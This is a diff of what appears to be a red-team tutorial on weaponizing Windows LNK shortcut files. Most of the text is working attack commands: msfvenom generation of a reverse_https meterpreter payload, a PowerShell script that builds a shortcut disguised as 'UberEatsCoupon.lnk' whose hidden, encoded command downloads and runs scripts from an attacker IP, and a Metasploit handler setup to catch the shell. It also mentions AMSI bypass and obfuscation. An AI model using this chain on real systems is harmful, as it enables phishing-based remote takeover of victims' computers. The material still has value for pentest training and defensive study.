@@ -25,7 +25,7 @@ An LNK file, short for Shell Link Binary File, is a file type associated with Wi
 <img src="/assets/AV/LNK.gif" width="1500" height="2500"/>
 
 Below are the steps:
-Generate a meterpreter shell code using the below command
+Generate a staged meterpreter shell code using the below command
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.20.131 LPORT=443 EXITFUNC=process -f ps1
 ```
@@ -66,7 +66,7 @@ Conduct obfuscation on both AMSI SCript and and Shell Code Injector.
 
 This process has been neglected for possible abuse cases.
 
-Finally craft our LNK file
+Finally crafting the LNK file
 
 ```bash
 $doordash = 'iex (iwr -UseBasicParsing http://192.168.20.131:8888/google.txt);(iwr -usebasicparsing http://192.168.20.131:8888/facebookTest.ps1)|IEX'
@@ -74,14 +74,24 @@ $doordash = 'iex (iwr -UseBasicParsing http://192.168.20.131:8888/google.txt);(i
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($doordash)
 $encodedCommand = [Convert]::ToBase64String($bytes)
 $obj = New-object -comobject wscript.shell
-$link = $obj.createshortcut("D:\Users\kkyun\Desktop\UberEatsCoupon.lnk")
+$link = $obj.createshortcut("D:\Users\hacker\Desktop\UberEatsCoupon.lnk")
 $link.windowstyle = "7"
 $link.targetpath = "C:\windows\system32\cmd.exe"
 $link.iconlocation = "C:\windows\system32\notepad.exe"
 $link.arguments = "/c powershell -Nop -ep bypass -w hidden -EncodedCommand  $($encodedCommand)"
 $link.save()
 ```
+With all the preperation done, the tester proceeded to receive the staged meterpreter shell 
 
-
+```bash
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost 
+set lport 
+set ENABLESTAGEENCODING true
+set AutoLoadStdapi false
+exploit
+```
 
 
